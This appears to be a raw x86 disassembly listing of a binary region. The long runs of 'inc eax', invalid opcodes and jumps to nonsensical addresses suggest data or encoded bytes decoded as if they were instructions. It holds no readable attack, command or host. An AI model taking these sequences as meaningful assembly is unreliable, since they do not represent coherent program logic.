  406dfc:	inc    ecx
  406dfd:	fadd   DWORD PTR [eax+0x40]
  406e00:	inc    eax
  406e01:	inc    eax
  406e02:	inc    eax
  406e03:	inc    eax
  406e04:	and    eax,0xcf404040
  406e09:	ret    0x4fc0
  406e0c:	adc    al,0x40
  406e0e:	pop    ebx
  406e0f:	mov    ah,0x42
  406e11:	and    DWORD PTR ds:0xdc046241,esi
  406e17:	add    eax,0x62cb5867
  406e1c:	addr16 addr16 inc edi
  406e1f:	retf   
  406e20:	sbb    eax,DWORD PTR [eax+0x40]
  406e23:	inc    eax
  406e24:	inc    eax
  406e25:	inc    eax
  406e26:	inc    eax
  406e27:	inc    eax
  406e28:	inc    eax
  406e29:	inc    eax
  406e2a:	inc    eax
  406e2b:	loope  0x406df1
  406e2d:	nop
  406e2e:	sub    BYTE PTR [edx-0x2c],cl
  406e31:	push   edx
  406e32:	fdivr  st,st(7)
  406e34:	aaa    
  406e35:	dec    eax
  406e36:	jnp    0x406df0
  406e38:	push   0x34521e41
  406e3d:	aam    0x40
  406e3f:	inc    eax
  406e40:	inc    eax
  406e41:	inc    eax
  406e42:	inc    eax
  406e43:	inc    eax
  406e44:	rol    DWORD PTR [eax+0x40],0x5b
  406e48:	or     eax,0xa3524160
  406e4d:	retf   0x2169
  406e50:	sub    ebp,DWORD PTR [eax+0x3c]
  406e53:	ds push es
  406e55:	ins    BYTE PTR es:[edi],dx
  406e56:	jmp    0x674fc4bd
  406e5b:	bound  esp,QWORD PTR [ecx]
  406e5d:	sub    cl,BYTE PTR [esi-0x24]
  406e60:	aas    
  406e61:	les    edx,FWORD PTR [esi+0x6a]
  406e64:	dec    ecx
  406e65:	inc    eax
  406e66:	and    bh,BYTE PTR [ebx+0x79]
  406e69:	repz test al,0x40
  406e6c:	inc    eax
  406e6d:	add    BYTE PTR [eax+0x40],al
  406e70:	inc    eax
  406e71:	inc    eax
  406e72:	inc    eax
  406e73:	inc    eax
  406e74:	je     0x406e59
  406e76:	and    DWORD PTR [eax],edx
  406e78:	adc    BYTE PTR [eax+0x42e7eea8],bh
  406e7e:	add    eax,0x2c36228
  406e83:	cmp    ch,BYTE PTR [edi]
  406e85:	jecxz  0x406e49
  406e87:	inc    eax
  406e88:	inc    eax
  406e89:	inc    eax
  406e8a:	inc    eax
  406e8b:	inc    eax
  406e8c:	inc    eax
  406e8d:	inc    eax
  406e8e:	inc    eax
  406e8f:	inc    eax
  406e90:	inc    eax
  406e91:	repz inc ebx
  406e93:	inc    edx
  406e94:	jle    0x406ea7
  406e96:	fist   DWORD PTR [ecx]
  406e98:	and    al,0x8a
  406e9a:	xchg   ecx,eax
  406e9b:	(bad)  
  406e9c:	push   ebx
  406e9d:	dec    ebx
  406e9e:	and    al,0xa3
  406ea0:	push   ss
  406ea1:	gs test al,0x4f
  406ea4:	lods   al,BYTE PTR ds:[esi]
  406ea5:	cmp    eax,0x42c13099
  406eaa:	adc    bh,BYTE PTR [ebx+ecx*8+0x50217685]
  406eb1:	xor    al,0x9c
  406eb3:	adc    eax,0x40404040
  406eb8:	inc    eax
  406eb9:	inc    eax
  406eba:	int3   
  406ebb:	jne    0x406efd
  406ebd:	adc    eax,0xc37d434c
  406ec2:	cmp    eax,DWORD PTR [edx+0x43]
  406ec5:	inc    eax
  406ec6:	int    0x88
  406ec8:	imul   ebp,DWORD PTR [edi+0x22],0xbccf485b
  406ecf:	sti    
  406ed0:	inc    eax
  406ed1:	shl    ebp,0x40
  406ed4:	add    cl,al
  406ed6:	inc    eax
  406ed7:	inc    eax
  406ed8:	inc    eax
  406ed9:	inc    eax
  406eda:	add    BYTE PTR [eax-0x20],al
  406edd:	adc    eax,0xa3390568
  406ee2:	dec    ebx
  406ee3:	bound  edx,QWORD PTR [eax]
  406ee5:	retf   
  406ee6:	jo     0x406eb3
  406ee8:	mov    DWORD PTR [edi+0x648042c0],edi
  406eee:	hlt    
  406eef:	js     0x406f0b
  406ef1:	push   edx
  406ef2:	outs   dx,DWORD PTR ds:[esi]
  406ef3:	xor    al,0x1a
  406ef5:	cmp    al,0xd
  406ef7:	xor    eax,0xd42ce5dd
  406efc:	cs inc eax
  406efe:	inc    eax
  406eff:	inc    eax
  406f00:	inc    eax
  406f01:	inc    eax
  406f02:	inc    eax
  406f03:	inc    eax
  406f04:	inc    eax
  406f05:	inc    DWORD PTR [eax+0x70]
  406f08:	jns    0x406f46
  406f0a:	jne    0x406efd
  406f0c:	jp     0x406f36
  406f0e:	pop    ebx
  406f0f:	mov    ecx,0xa9b9bafd
  406f14:	rcl    DWORD PTR [eax+eiz*1-0x3d],0x41
  406f19:	ret    
  406f1a:	arpl   si,bx
  406f1c:	jno    0x406eb0
  406f1e:	add    BYTE PTR [ebp-0x80],0x51
  406f22:	xchg   edx,eax
  406f23:	imul   eax,ecx,0xc3400d45
  406f29:	inc    bh
  406f2b:	mov    gs,WORD PTR [ebx+0x38]
  406f2e:	inc    eax
  406f2f:	inc    eax
  406f30:	inc    eax
  406f31:	inc    eax
  406f32:	inc    eax
  406f33:	inc    eax
  406f34:	inc    eax
  406f35:	inc    eax
  406f36:	inc    eax
  406f37:	inc    eax
  406f38:	leave  
  406f39:	dec    ecx
  406f3a:	dec    esp
  406f3b:	dec    edi
  406f3c:	scas   al,BYTE PTR es:[edi]
  406f3d:	popa   
  406f3e:	ret    0x8cd1
  406f41:	test   al,0x41
  406f43:	test   al,0x66
  406f45:	push   cs
  406f46:	and    DWORD PTR [eax+0xd43670d],ebp
  406f4c:	ins    BYTE PTR es:[edi],dx
  406f4d:	mov    eax,ds:0x7dcb1037
  406f52:	fadd   QWORD PTR [ebx-0x2f]
  406f55:	gs ret 0x8cb4
  406f59:	inc    eax
  406f5a:	inc    eax
  406f5b:	inc    eax
  406f5c:	inc    eax
  406f5d:	inc    eax
  406f5e:	inc    eax
  406f5f:	inc    eax
  406f60:	inc    eax
  406f61:	add    BYTE PTR [ebx],dh
  406f63:	push   esp
  406f64:	lods   al,BYTE PTR ds:[esi]
  406f65:	aam    0x63
  406f67:	pusha  
  406f68:	inc    ecx
  406f69:	inc    esp
  406f6a:	mov    ah,0xc4
  406f6c:	or     eax,0x54364337
  406f71:	jne    0x406f88
  406f73:	addr16 retf 
  406f75:	sub    DWORD PTR [ebx+0x7b4cd0c0],esp
  406f7b:	push   0x35432742
  406f80:	shl    BYTE PTR [edx-0x44],1
  406f83:	addr16 inc eax
  406f85:	aaa    
  406f86:	pusha  
  406f87:	das    
  406f88:	inc    eax
  406f89:	inc    eax
  406f8a:	inc    eax
  406f8b:	inc    eax
  406f8c:	inc    eax
  406f8d:	inc    eax
  406f8e:	and    eax,0x42404040
  406f93:	imul   eax,DWORD PTR [ebx+0x4c],0xffffffff
  406f97:	ins    DWORD PTR es:[edi],dx
  406f98:	mov    edi,0x61a4d168
  406f9d:	in     al,0x8c
  406f9f:	imul   ebp,DWORD PTR ds:0x38396cc0,0x61
  406fa6:	or     eax,0x59600557
  406fab:	xor    cl,cl
  406fad:	test   al,0x37
  406faf:	push   0x61
  406fb1:	add    bl,al
  406fb3:	mov    WORD PTR [ecx+0x10],es
  406fb6:	lds    edx,FWORD PTR [ecx+0x4040406c]
  406fbc:	inc    eax
  406fbd:	inc    eax
  406fbe:	inc    eax
  406fbf:	inc    eax
  406fc0:	inc    eax
  406fc1:	inc    eax
  406fc2:	inc    eax
  406fc3:	shl    BYTE PTR [edx],0x15
  406fc6:	add    DWORD PTR [ecx+0x44],0x9f0923f6
  406fcd:	leave  
  406fce:	ret    
  406fcf:	and    BYTE PTR [eax],0x39
  406fd2:	jl     0x40701f
  406fd4:	inc    edx
  406fd5:	test   al,0xbc
  406fd7:	inc    edx
  406fd8:	and    DWORD PTR [bp+di-0x2d32],0x4c7a0d15
  406fe1:	ss clc 
  406fe3:	jle    0x407052
  406fe5:	inc    eax
  406fe6:	inc    eax
  406fe7:	inc    eax
  406fe8:	inc    eax
  406fe9:	inc    eax
  406fea:	inc    eax
  406feb:	rol    DWORD PTR [eax+0x40],0x42
  406fef:	inc    ebx
  406ff0:	pop    esp
  406ff1:	push   cs
  406ff2:	call   0x633fb05a
  406ff7:	inc    esp
  406ff8:	(bad)  
  406ffa:	pop    edx
  406ffb:	in     al,dx
  406ffc:	adc    al,0x80
  406ffe:	cmp    al,0x24
  407000:	lods   al,BYTE PTR ds:[esi]
  407001:	inc    eax
  407002:	inc    eax
  407003:	add    BYTE PTR [eax+0x40],al
  407006:	inc    eax
  407007:	inc    eax
  407008:	inc    eax
  407009:	inc    eax
  40700a:	sar    DWORD PTR [ebx+eiz*2],1
  40700d:	xor    ch,BYTE PTR [eax-0x293497f3]
  407013:	xchg   esp,eax
  407014:	retf   
  407015:	push   ebx
  407016:	adc    DWORD PTR [ecx+0x17],edi
  407019:	adc    eax,0xc06740cd
  40701e:	mov    ah,0xbc
  407020:	inc    esi
  407021:	addr16 pop esi
  407023:	inc    eax
  407024:	inc    eax
  407025:	inc    eax
  407026:	inc    eax
  407027:	inc    eax
  407028:	inc    eax
  407029:	inc    eax
  40702a:	inc    eax
  40702b:	inc    eax
  40702c:	inc    eax
  40702d:	dec    eax
  40702e:	pop    edi
  40702f:	jl     0x407073
  407031:	or     eax,0x4020c3a5
  407036:	stos   DWORD PTR es:[edi],eax
  407037:	inc    ecx
  407038:	and    al,0x6b
  40703a:	addr16 inc eax
  40703c:	inc    eax
  40703d:	inc    eax
  40703e:	inc    eax
  40703f:	inc    eax
  407040:	inc    eax
  407041:	int3   
  407042:	jne    0x407084
  407044:	jnp    0x407087
  407046:	inc    eax
  407047:	aas    
  407048:	inc    edi
  407049:	call   0x248d31f2
  40704e:	inc    eax
  40704f:	xchg   DWORD PTR [ebp+0x62],edx
  407052:	or     eax,0x40004cd4
  407057:	and    al,0x40
  407059:	dec    esp
  40705a:	retf   
  40705b:	fisubr DWORD PTR [ebp-0x64]
  40705e:	inc    eax
  40705f:	and    eax,0x6545084a
  407064:	imul   esp,DWORD PTR [edx+0x40],0x4040c100
  40706b:	inc    eax
  40706c:	inc    eax
  40706d:	add    BYTE PTR [eax+0x40],al
  407070:	pop    esi
  407071:	inc    eax
  407072:	push   edx
  407073:	inc    esp
  407074:	fld    DWORD PTR [edx-0x70]
  407077:	cdq    
  407078:	arpl   WORD PTR [ebp+0x42],cx
  40707b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40707c:	cmp    esp,DWORD PTR [ecx+0x1844aa4c]
  407082:	jb     0x4070ec
  407084:	pushf  
  407085:	xor    DWORD PTR [ecx],ecx
  407087:	jl     0x4070ee
  407089:	inc    eax
  40708a:	pop    ds
  40708b:	aam    0x4c
  40708d:	push   edx
  40708e:	cmp    bl,BYTE PTR [ebx-0x3b0591c9]
  407094:	inc    edx
  407095:	inc    eax
  407096:	inc    eax
  407097:	inc    eax
  407098:	inc    eax
  407099:	inc    eax
  40709a:	inc    eax
  40709b:	inc    eax
  40709c:	inc    eax
  40709d:	inc    DWORD PTR [eax+0x50]
  4070a0:	fist   DWORD PTR [edx+0x4fb4cda7]
  4070a6:	cmp    eax,0xcc155475
  4070ab:	inc    ecx
  4070ac:	sbb    al,0x40
  4070ae:	inc    eax
  4070af:	inc    eax
  4070b0:	inc    eax
  4070b1:	inc    eax
  4070b2:	inc    eax
  4070b3:	inc    eax
  4070b4:	inc    eax
  4070b5:	inc    eax
  4070b6:	inc    eax
  4070b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4070b8:	push   ebp
  4070b9:	frstor [edx-0x38]
  4070bc:	popa   
  4070bd:	jnp    0x407044
  4070bf:	inc    ecx
  4070c0:	pusha  
  4070c1:	or     BYTE PTR [edi+0x12],ch
  4070c4:	pop    esi
  4070c5:	inc    ecx
  4070c6:	bound  ebp,QWORD PTR [esi-0x22]
  4070c9:	dec    ebx
  4070ca:	lods   al,BYTE PTR ds:[esi]
  4070cb:	(bad)  
  4070cc:	popa   
  4070cd:	arpl   WORD PTR [esi-0x20],bp
  4070d0:	inc    edx
  4070d1:	cmp    eax,0x40108e7e
  4070d6:	retf   0x4063
  4070d9:	inc    eax
  4070da:	inc    eax
  4070db:	inc    eax
  4070dc:	inc    eax
  4070dd:	inc    eax
  4070de:	inc    eax
  4070df:	inc    eax
  4070e0:	add    BYTE PTR ds:0x638a3666,bh
  4070e6:	sub    BYTE PTR [eax-0x2198b997],ch
  4070ec:	test   al,0xff
  4070ee:	and    DWORD PTR [eax-0x68],eax
  4070f1:	pusha  
  4070f2:	add    DWORD PTR [edx],esp
  4070f4:	ror    DWORD PTR [eax+0x43],1
  4070f7:	inc    eax
  4070f8:	stc    
  4070f9:	xor    al,0x63
  4070fb:	int    0x61
  4070fd:	loope  0x40717a
  4070ff:	inc    edx
  407100:	dec    eax
  407101:	and    al,0x4a
  407103:	adc    BYTE PTR [esi+0x4007406b],dl
  407109:	inc    eax
  40710a:	inc    eax
  40710b:	inc    eax
  40710c:	inc    eax
  40710d:	inc    eax
  40710e:	and    eax,0x62404040
  407113:	lds    esp,FWORD PTR [eax+0x40]
  407116:	push   0xb9a97be7
  40711b:	push   esi
  40711c:	push   esp
  40711d:	inc    eax
  40711e:	inc    eax
  40711f:	inc    edi
  407120:	pusha  
  407121:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407122:	test   BYTE PTR [eax+0x2640400d],dl
  407128:	inc    ecx
  407129:	add    eax,0x48cbf964
  40712e:	inc    eax
  40712f:	xor    eax,DWORD PTR [eax-0x35]
  407132:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407133:	les    esi,FWORD PTR [ebx-0x6b]
  407136:	inc    eax
  407137:	pop    eax
  407138:	inc    eax
  407139:	inc    eax
  40713a:	inc    eax
  40713b:	inc    eax
  40713c:	inc    eax
  40713d:	inc    eax
  40713e:	inc    eax
  40713f:	inc    eax
  407140:	inc    eax
  407141:	inc    eax
  407142:	sub    al,0x48
  407144:	inc    ebp
  407145:	inc    edx
  407146:	push   ecx
  407147:	inc    esp
  407148:	cmp    eax,0x914955a3
  40714d:	ds addr16 int 0xec
  407151:	popa   
  407152:	inc    eax
  407153:	and    al,0x67
  407155:	jb     0x4071c3
  407157:	mov    esp,0x40404023
  40715c:	inc    eax
  40715d:	inc    eax
  40715e:	inc    eax
  40715f:	rol    DWORD PTR [eax+0x40],0x21
  407163:	aaa    
  407164:	mov    esp,0x15c31943
  407169:	loope  0x4071b0
  40716b:	jecxz  0x4071d1
  40716d:	sub    al,0x42
  40716f:	test   al,0x48
  407171:	enter  0x4121,0xb7
  407175:	jns    0x4071b4
  407177:	adc    BYTE PTR [eax+0x40],al
  40717a:	add    BYTE PTR [eax+0x40],al
  40717d:	inc    eax
  40717e:	inc    eax
  40717f:	inc    eax
  407180:	inc    eax
  407181:	outs   dx,DWORD PTR ds:[esi]
  407182:	andps  xmm7,xmm5
  407185:	shr    BYTE PTR [eax+0x7f344c42],0x63
  40718c:	inc    ecx
  40718d:	inc    esp
  40718e:	adc    DWORD PTR [eax+0x41],esp
  407191:	fst    QWORD PTR [edx]
  407193:	scas   eax,DWORD PTR es:[edi]
  407194:	dec    edi
  407195:	push   eax
  407196:	pushf  
  407197:	inc    edx
  407198:	inc    eax
  407199:	inc    eax
  40719a:	inc    eax
  40719b:	inc    eax
  40719c:	inc    eax
  40719d:	inc    eax
  40719e:	inc    eax
  40719f:	inc    eax
  4071a0:	inc    eax
  4071a1:	inc    eax
  4071a2:	and    DWORD PTR [eax-0x2b],ecx
  4071a5:	addr16 inc edx
  4071a7:	das    
  4071a8:	or     eax,0xade52cc8
  4071ad:	es pop ss
  4071af:	cmp    al,0xcb
  4071b1:	jne    0x40716b
  4071b3:	mov    ah,0x39
  4071b5:	adc    eax,DWORD PTR [eax+0x40]
  4071b8:	inc    eax
  4071b9:	inc    eax
  4071ba:	inc    eax
  4071bb:	inc    eax
  4071bc:	int3   
  4071bd:	jne    0x4071ff
  4071bf:	xor    al,0x65
  4071c1:	inc    eax
  4071c2:	dec    eax
  4071c3:	adc    ecx,DWORD PTR ds:0xcf5d2f0a
  4071c9:	inc    esp
  4071ca:	leave  
  4071cb:	sub    eax,0x40a508c9
  4071d0:	mov    ah,0x71
  4071d2:	mov    ah,0x40
  4071d4:	inc    ecx
  4071d5:	mov    ah,0xcb
  4071d7:	ss adc BYTE PTR fs:0xe1708150,cl
  4071df:	inc    eax
  4071e0:	add    BYTE PTR [eax+0x0],0xc1
  4071e4:	inc    eax
  4071e5:	inc    eax
  4071e6:	inc    eax
  4071e7:	inc    eax
  4071e8:	add    BYTE PTR [eax+0x62],al
  4071eb:	retf   
  4071ec:	pusha  
  4071ed:	ret    
  4071ee:	push   ebx
  4071ef:	pop    ecx
  4071f0:	sub    DWORD PTR [ebx-0x6a],esi
  4071f3:	dec    esp
  4071f4:	ss mov ah,0x3b
  4071f7:	loope  0x40725a
  4071f9:	inc    edx
  4071fa:	pop    ebx
  4071fb:	add    eax,0x26940d00
  407200:	inc    eax
  407201:	jns    0x4071d8
  407203:	retf   
  407204:	xor    al,0xcb
  407206:	inc    esi
  407207:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407208:	xor    bh,ah
  40720a:	nop
  40720b:	nop
  40720c:	dec    esp
  40720d:	mov    al,ds:0x40404b39
  407212:	inc    eax
  407213:	inc    eax
  407214:	inc    eax
  407215:	inc    eax
  407216:	inc    eax
  407217:	inc    eax
  407218:	inc    DWORD PTR [eax+0x79]
  40721b:	mov    dl,0x4f
  40721d:	stos   DWORD PTR es:[edi],eax
  40721e:	xor    al,0x47
  407220:	and    cl,ah
  407222:	dec    eax
  407223:	push   esp
  407224:	ror    DWORD PTR [edx],0x56
  407227:	pop    eax
  407228:	pop    es
  407229:	ds add eax,0x3a444a53
  40722f:	rcl    ch,0x25
  407232:	daa    
  407233:	push   eax
  407234:	rol    BYTE PTR [eax+0x40],1
  407237:	inc    eax
  407238:	inc    eax
  407239:	inc    eax
  40723a:	inc    eax
  40723b:	inc    eax
  40723c:	inc    eax
  40723d:	inc    eax
  40723e:	inc    eax
  40723f:	leave  
  407240:	inc    esp
  407241:	mov    al,ds:0x4043ff38
  407246:	adc    eax,0x3705bc26
  40724b:	les    eax,FWORD PTR [ecx+0x11]
  40724e:	test   al,0xb4
  407250:	push   0x404040cb
  407255:	inc    eax
  407256:	inc    eax
  407257:	inc    eax
  407258:	inc    eax
  407259:	inc    eax
  40725a:	add    BYTE PTR ds:0x126b57ad,bl
  407260:	adc    eax,0xcdfe40bb
  407265:	inc    eax
  407266:	popa   
  407267:	mov    eax,0x94ffdccb
  40726c:	jecxz  0x407297
  40726e:	inc    edx
  40726f:	inc    ecx
  407270:	mov    esp,0x14c86735
  407275:	fnstenv [ecx]
  407277:	inc    eax
  407278:	inc    eax
  407279:	inc    eax
  40727a:	inc    eax
  40727b:	inc    eax
  40727c:	inc    eax
  40727d:	and    eax,0xe6404040
  407282:	dec    edi
  407283:	aam    0x4c
  407285:	inc    esi
  407286:	loope  0x4072ca
  407288:	retf   
  407289:	cmp    al,0x54
  40728b:	dec    ebp
  40728c:	test   al,0xcf
  40728e:	jb     0x4072b2
  407290:	adc    cl,BYTE PTR [esi-0x80]
  407293:	pusha  
  407294:	inc    eax
  407295:	shl    ecx,cl
  407297:	inc    eax
  407298:	xor    bh,BYTE PTR [eax]
  40729a:	inc    edi
  40729b:	push   0x2f43402a
  4072a0:	jmp    0x6140:0x40438ec2
  4072a7:	inc    eax
  4072a8:	inc    eax
  4072a9:	inc    eax
  4072aa:	inc    eax
  4072ab:	inc    eax
  4072ac:	inc    eax
  4072ad:	inc    eax
  4072ae:	inc    eax
  4072af:	inc    eax
  4072b0:	inc    eax
  4072b1:	sub    BYTE PTR [eax+0x10],ch
  4072b4:	test   al,0xa0
  4072b6:	add    DWORD PTR [eax+0x72],eax
  4072b9:	adc    eax,0xc6106245
  4072be:	xor    BYTE PTR [eax+0x2b],al
  4072c1:	dec    ecx
  4072c2:	cmp    BYTE PTR [eax+0x40],al
  4072c5:	inc    eax
  4072c6:	inc    eax
  4072c7:	inc    eax
  4072c8:	inc    eax
  4072c9:	rol    DWORD PTR [eax+0x40],0xc5
  4072cd:	or     al,BYTE PTR [eax+0x58]
  4072d0:	(bad)  [edx+0x4b]
  4072d3:	jbe    0x407324
  4072d5:	inc    esp
  4072d6:	and    DWORD PTR [eax],ebp
  4072d8:	cmc    
  4072d9:	aas    
  4072da:	inc    ecx
  4072db:	and    al,0x54
  4072dd:	imul   DWORD PTR [ecx+0x46]
  4072e0:	add    BYTE PTR [ebp+eiz*2-0x6f],0xa0
  4072e5:	dec    edi
  4072e6:	inc    eax
  4072e7:	mov    ds:0x624266e7,eax
  4072ec:	scas   eax,DWORD PTR es:[edi]
  4072ed:	dec    eax
  4072ee:	inc    eax
  4072ef:	xor    al,0x47
  4072f1:	mov    edi,0x40004040
  4072f6:	inc    eax
  4072f7:	inc    eax
  4072f8:	inc    eax
  4072f9:	inc    eax
  4072fa:	inc    eax
  4072fb:	sub    DWORD PTR [ebx],esi
  4072fd:	bound  edx,QWORD PTR ds:0x30cb68c0
  407303:	gs inc eax
  407305:	xlat   BYTE PTR ds:[ebx]
  407306:	retf   
  407307:	inc    eax
  407308:	stos   DWORD PTR es:[edi],eax
  407309:	ds dec ebp
  40730b:	inc    eax
  40730c:	bound  edi,QWORD PTR [eax+0x404028bc]
  407312:	inc    eax
  407313:	inc    eax
  407314:	inc    eax
  407315:	inc    eax
  407316:	inc    eax
  407317:	inc    eax
  407318:	inc    eax
  407319:	inc    eax
  40731a:	in     al,dx
  40731b:	dec    ecx
  40731c:	mov    eax,ds:0xd63cc2e
  407321:	nop
  407322:	(bad)  
  407323:	jecxz  0x407329
  407325:	jg     0x4072be
  407327:	imul   ecx,ebx,0x617d87bf
  40732d:	inc    eax
  40732e:	icebp  
  40732f:	pop    esp
  407330:	pop    edi
  407331:	inc    eax
  407332:	inc    eax
  407333:	inc    eax
  407334:	inc    eax
  407335:	inc    eax
  407336:	inc    eax
  407337:	int3   
  407338:	jne    0x40737a
  40733a:	push   eax
  40733b:	lds    ecx,FWORD PTR [eax+0x6e]
  40733e:	and    edx,DWORD PTR [edi+0x62]
  407341:	dec    esp
  407342:	inc    ebp
  407343:	test   DWORD PTR [edx],ebp
  407345:	and    eax,0x42ca71aa
  40734a:	inc    ebx
  40734b:	xlat   BYTE PTR ds:[ebx]
  40734c:	mov    edi,0x40c10040
  407351:	inc    eax
  407352:	inc    eax
  407353:	inc    eax
  407354:	add    BYTE PTR [eax+0x4f],al
  407357:	push   ds
  407358:	in     al,dx
  407359:	sar    BYTE PTR [eax+eax*8],0x30
  40735d:	arpl   WORD PTR ds:0x77bc5a48,sp
  407363:	fbld   TBYTE PTR [edx+0x6b]
  407366:	inc    ecx
  407367:	cs retf 
  407369:	outs   dx,BYTE PTR ds:[esi]
  40736a:	or     BYTE PTR [eax+0xa2171c4],ch
  407370:	inc    esi
  407371:	xor    eax,0x324fbf42
  407376:	sub    al,BYTE PTR [ebp-0x7]
  407379:	bound  edi,QWORD PTR ds:0x40404040
  40737f:	inc    eax
  407380:	inc    eax
  407381:	inc    eax
  407382:	inc    eax
  407383:	inc    DWORD PTR [eax+0x2a]
  407386:	inc    eax
  407387:	xchg   esp,eax
  407388:	loope  0x4073bc
  40738a:	les    eax,FWORD PTR [ebx+0x6c]
  40738d:	adc    dh,BYTE PTR [eax-0x57bdbc40]
  407393:	mov    esp,0xf33d4864
  407398:	and    DWORD PTR [ecx],ebp
  40739a:	adc    BYTE PTR ds:0x62c31553,al
  4073a0:	aas    
  4073a1:	jbe    0x407403
  4073a3:	retf   
  4073a4:	inc    eax
  4073a5:	inc    eax
  4073a6:	inc    eax
  4073a7:	inc    eax
  4073a8:	inc    eax
  4073a9:	inc    eax
  4073aa:	inc    eax
  4073ab:	inc    eax
  4073ac:	inc    eax
  4073ad:	inc    eax
  4073ae:	(bad)  
  4073b0:	mov    al,0xc
  4073b2:	sub    eax,DWORD PTR [edx+0x1f]
  4073b5:	cwde   
  4073b6:	sbb    eax,0x23930545
  4073bb:	and    al,0x52
  4073bd:	inc    edx
  4073be:	push   ebx
  4073bf:	dec    ecx
  4073c0:	leave  
  4073c1:	call   0x4080b406
  4073c6:	inc    eax
  4073c7:	inc    eax
  4073c8:	inc    eax
  4073c9:	inc    eax
  4073ca:	add    ah,al
  4073cc:	push   edx
  4073cd:	sbb    bh,ch
  4073cf:	std    
  4073d0:	cmp    al,0x4c
  4073d2:	and    ah,BYTE PTR [ebp+0x40]
  4073d5:	add    ah,bh
  4073d7:	push   ecx
  4073d8:	inc    eax
  4073d9:	inc    eax
  4073da:	inc    eax
  4073db:	inc    eax
  4073dc:	inc    eax
  4073dd:	inc    eax
  4073de:	and    eax,0xac404040
  4073e3:	inc    edi
  4073e4:	push   0x6363f534
  4073e9:	mov    BYTE PTR [esi+edi*1-0x34],al
  4073ed:	mov    ds:0xbe983229,eax
  4073f2:	push   edx
  4073f3:	aam    0xfb
  4073f5:	ins    DWORD PTR es:[edi],dx
  4073f6:	jb     0x4073fc
  4073f8:	push   edi
  4073f9:	inc    eax
  4073fa:	inc    eax
  4073fb:	inc    eax
  4073fc:	inc    eax
  4073fd:	inc    eax
  4073fe:	inc    eax
  4073ff:	inc    eax
  407400:	inc    eax
  407401:	inc    eax
  407402:	inc    eax
  407403:	mov    ecx,0x617f7c28
  407408:	inc    eax
  407409:	(bad)  
  40740a:	in     eax,dx
  40740b:	push   ebx
  40740c:	call   0x299c2b8d
  407411:	and    BYTE PTR [edi-0x22],0xed
  407415:	std    
  407416:	(bad)  
  407417:	loope  0x407447
  407419:	and    eax,0x62653559
  40741e:	adc    DWORD PTR [edx+0x42],ebx
  407421:	adc    al,0x35
  407423:	inc    edx
  407424:	rol    BYTE PTR [eax+0x40],cl
  407427:	inc    eax
  407428:	inc    eax
  407429:	inc    eax
  40742a:	inc    eax
  40742b:	rol    DWORD PTR [eax+0x40],0x73
  40742f:	out    0xa1,al
  407431:	xor    dh,bl
  407433:	mov    ah,0x3d
  407435:	clc    
  407436:	xor    BYTE PTR [edx+0x4e],ah
  407439:	inc    eax
  40743a:	bound  ecx,QWORD PTR ds:0x5354a87b
  407440:	popa   
  407441:	xor    ecx,ebx
  407443:	jnp    0x407485
  407445:	adc    ch,BYTE PTR [eax]
  407447:	retf   0x2a50
  40744a:	addr16 mov al,ds:0x4890
  40744e:	call   0x400d:0x354821f9
  407455:	inc    eax
  407456:	add    BYTE PTR [eax+0x40],al
  407459:	inc    eax
  40745a:	inc    eax
  40745b:	inc    eax
  40745c:	inc    eax
  40745d:	push   ebx
  40745e:	inc    edx
  40745f:	sub    bl,BYTE PTR [edx-0x41]
  407462:	adc    DWORD PTR [eax],ebp
  407464:	retf   
  407465:	rcl    al,0x62
  407468:	pop    ds
  407469:	jne    0x40749d
  40746b:	sbb    ah,BYTE PTR [ecx+0x5a]
  40746e:	cld    
  40746f:	out    0x38,eax
  407471:	mov    eax,ds:0x2c46013e
  407476:	bound  ebx,QWORD PTR [eax+0x40407b5d]
  40747c:	inc    eax
  40747d:	inc    eax
  40747e:	inc    eax
  40747f:	inc    eax
  407480:	inc    eax
  407481:	inc    eax
  407482:	inc    eax
  407483:	inc    eax
  407484:	inc    eax
  407485:	xchg   bx,ax
  407487:	mov    al,0xd9
  407489:	dec    esi
  40748a:	mov    al,0x65
  40748c:	es dec ebp
  40748e:	and    BYTE PTR [ebx],cl
  407490:	aam    0x8c
  407492:	popa   
  407493:	add    BYTE PTR [eax-0x30],al
  407496:	pusha  
  407497:	frstor [edx+0x5c]
  40749a:	mul    DWORD PTR [ebx]
  40749c:	pusha  
  40749d:	outs   dx,BYTE PTR ds:[esi]
  40749e:	sub    al,0x41
  4074a0:	push   esp
  4074a1:	sub    al,0x98
  4074a3:	inc    ebp
  4074a4:	and    al,0xae
  4074a6:	lock mov al,0x34
  4074a9:	push   0x40404020
  4074ae:	inc    eax
  4074af:	inc    eax
  4074b0:	inc    eax
  4074b1:	int3   
  4074b2:	jne    0x4074f4
  4074b4:	mov    ds:0x5c09741,eax
  4074b9:	inc    esp
  4074ba:	or     dl,BYTE PTR [esi+0x4e]
  4074bd:	jl     0x4074b1
  4074bf:	inc    esp
  4074c0:	xchg   DWORD PTR [eax+0x40a549a9],esp
  4074c6:	push   ebx
  4074c7:	cs inc edx
  4074c9:	ret    
  4074ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4074cb:	mov    ch,0x68
  4074cd:	xor    eax,0xbcc9eacd
  4074d2:	inc    eax
  4074d3:	add    cl,al
  4074d5:	inc    eax
  4074d6:	inc    eax
  4074d7:	inc    eax
  4074d8:	inc    eax
  4074d9:	add    BYTE PTR [eax+0x16],al
  4074dc:	ret    
  4074dd:	and    DWORD PTR [esi],eax
  4074df:	inc    ecx
  4074e0:	scas   al,BYTE PTR es:[edi]
  4074e1:	mov    ah,0x43
  4074e3:	daa    
  4074e4:	outs   dx,BYTE PTR ds:[esi]
  4074e5:	xor    al,0x7c
  4074e7:	cmc    
  4074e8:	int    0x5
  4074ea:	jno    0x40755b
  4074ec:	hlt    
  4074ed:	mov    eax,ds:0xcb48fb40
  4074f2:	xor    al,0x48
  4074f4:	add    DWORD PTR ds:0x4cd09721,ebp
  4074fa:	dec    eax
  4074fb:	bound  eax,QWORD PTR [edi]
  4074fd:	loope  0x40757b
  4074ff:	icebp  
  407500:	push   edx
  407501:	adc    eax,0x40404040
  407506:	inc    eax
  407507:	inc    eax
  407508:	inc    eax
  407509:	inc    eax
  40750a:	inc    DWORD PTR [eax-0x5e]
  40750d:	inc    esi
  40750e:	sub    edi,DWORD PTR [edi-0x345eabc0]
